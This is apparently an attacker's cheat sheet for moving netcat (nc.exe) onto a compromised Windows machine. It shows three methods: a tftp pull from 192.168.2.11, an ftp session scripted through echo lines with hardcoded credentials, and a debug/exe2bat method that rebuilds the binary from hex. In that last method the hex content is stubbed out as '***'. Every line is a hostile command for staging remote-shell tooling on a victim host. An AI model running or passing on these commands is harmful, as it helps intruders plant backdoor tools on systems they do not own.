WINDOWS:
tftp -i 192.168.2.11 nc.exe

ftp:
echo open 192.168.2.11 21 >> 1.txt
echo robot >> 1.txt
echo passwd >> 1.txt
echo bin >> 1.txt
echo GET nc.exe >> 1.txt
echo bye >> 1.txt
ftp -s:1.txt

debug:
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
echo *** >> 123.hex
debug<123.hex
copy 123.hex nc.exe

